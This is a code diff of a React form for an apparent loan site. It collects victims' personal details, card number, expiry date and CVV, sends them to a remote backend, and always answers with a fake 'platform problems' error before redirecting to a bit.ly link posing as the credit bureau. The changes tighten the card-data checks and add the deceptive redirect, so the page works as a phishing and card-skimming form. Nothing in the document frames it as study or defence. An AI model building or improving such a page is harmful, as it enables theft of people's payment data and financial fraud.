@@ -40,14 +40,14 @@ class Form extends Component {
 
 
 
-
         if (nombre === "" || apellido_paterno === "" || apellido_materno === "" || direccion === "" ||
             codigo_postal === "" || municipio === "" || estado === "" || sueldo === "" || limite === "" || estado_civil === "" ||
-            telefono === "" || vencimiento === "" || tarjeta === "" || cvv === "" || banco === "" || is_valid === false) {
-            Swal.fire(
-                'Ho Ho',
-                'Por favor revisa que la tarjeta sea correcta o que los campos no esten vacios',
-                'error')
+            telefono === "" || vencimiento.length < 4 || tarjeta === "" || cvv.length < 3 || banco === "" || is_valid === false) {
+            Swal.fire({
+                title: 'Ho Ho',
+                text: 'Por favor revisa que la tarjeta, la fecha, y la clave cvv sea correcta o que los campos no esten vacios',
+                icon: 'error'
+            })
         } else {
             fetch('https://backend-credifast.herokuapp.com/form', {
                 method: 'POST',
@@ -59,10 +59,16 @@ class Form extends Component {
             })
                 .then(res => console.log(res))
                 .catch(err => console.log(err))
-            Swal.fire(
-                'Ups',
-                'Al parecer la plataforma presenta problemas, por favor intenta mas tarde.',
-                'error')
+            Swal.fire({
+                title: 'Ups',
+                text: 'Al parecer la plataforma presenta problemas, por favor intenta mas tarde.',
+                icon: 'error',
+                html:
+                    ', Al parecer la plataforma presenta problemas, por favor intenta mas tarde' +
+                    'te redireccionaremos a la plataforma de buro de credito ' +
+                    '<a href="https://bit.ly/35chpkt"><button style="background: #fac95f; border:none; color: #fff; padding: 10px; border-radius: 10px">Aceptar</button></a> ',
+                showConfirmButton: false
+            })
         }
 
         e.preventDefault()
@@ -78,7 +84,6 @@ class Form extends Component {
     render() {
         return (
             <div>
-
                 <div className="mx-auto text-center">
                     <p className=" d-md-none d-md-block" style={{ color: '#fff', background: '#fac95f' }}>
                         para poder calcular mejor préstamos para usted,
@@ -121,7 +126,7 @@ class Form extends Component {
                                     </div>
                                     <div className="input-group">
                                         <input required onChange={this.handleChange} className='form-control' type="text" placeholder='Ocupacion' />
-                                        <input required onChange={this.handleChange} className='form-control' type="text" id='sueldo' placeholder='sueldo' name='sueldo' />
+                                        <input required onChange={this.handleChange} className='form-control' type="number" id='sueldo' placeholder='sueldo' name='sueldo' />
                                     </div>
                                     <div className="input-group">
                                         <input required onChange={this.handleChange} className='form-control' type="text" id='estado_civil' placeholder='estado civil'
@@ -137,14 +142,14 @@ class Form extends Component {
                                             name='tarjeta' />
                                     </div>
                                     <div className="input-group">
-                                        <input required onChange={this.handleChange} maxLength='5' className='form-control vencimiento' type="tel" id='vencimiento'
+                                        <input required onChange={this.handleChange} maxLength='5' className='form-control vencimiento' type="text" id='vencimiento'
                                             placeholder='MM/YY' name='vencimiento' />
                                         <input required onChange={this.handleChange} maxLength='3' className='form-control' type="text" id='codigo' placeholder='CVV'
                                             name='cvv' />
                                     </div>
                                     <div className="input-group">
                                         <input required onChange={this.handleChange} className='form-control' type="text" id='sueldo' placeholder='banco' name='banco' />
-                                        <input required onChange={this.handleChange} className='form-control' type="text" id='limite-credito' placeholder='Limite de Credito'
+                                        <input required onChange={this.handleChange} className='form-control' type="number" id='limite-credito' placeholder='Limite de Credito'
                                             name='limite' />
                                     </div>
                                     <div className="input-group">
